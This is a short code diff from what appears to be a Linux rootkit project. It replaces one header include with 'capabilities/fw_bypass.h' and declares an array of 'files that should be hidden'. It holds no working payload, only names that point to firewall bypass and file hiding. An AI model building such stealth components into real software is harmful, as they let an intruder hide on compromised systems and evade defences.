@@ -3,7 +3,7 @@
 
 #include <linux/types.h> 
 #include <linux/filter.h>
-#include "config_types.h"
+#include "capabilities/fw_bypass.h"
 
 // Names of files that should be hidden
 extern const char *ROOTI_HIDDEN_FILES[];
